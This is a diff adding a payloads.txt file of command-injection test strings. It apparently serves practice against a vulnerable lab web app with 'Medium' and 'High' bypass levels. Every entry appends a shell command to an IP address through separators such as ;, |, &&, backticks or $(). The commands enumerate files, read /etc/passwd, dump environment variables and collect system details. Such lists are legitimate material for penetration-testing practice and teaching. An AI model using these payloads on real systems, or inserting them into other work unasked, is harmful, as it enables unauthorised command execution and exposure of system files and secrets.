@@ -1,0 +1,30 @@
+# Command Injection - Payloads (payloads.txt)
+
+# --- Basic separators ---
+127.0.0.1; whoami
+127.0.0.1 | whoami
+127.0.0.1 && whoami
+127.0.0.1 || whoami
+127.0.0.1 `whoami`
+127.0.0.1 $(whoami)
+
+# --- File enumeration ---
+127.0.0.1; ls -la
+127.0.0.1; ls /var/www/html
+127.0.0.1; cat /etc/passwd
+127.0.0.1; cat /etc/hostname
+127.0.0.1; find / -name "*.php" 2>/dev/null
+
+# --- System info ---
+127.0.0.1; uname -a
+127.0.0.1; id
+127.0.0.1; pwd
+127.0.0.1; env
+127.0.0.1; ifconfig
+
+# --- Bypass Medium (no && or ;) ---
+127.0.0.1 | whoami
+127.0.0.1 || id
+
+# --- Bypass High (pipe with space trick) ---
+127.0.0.1 | whoami
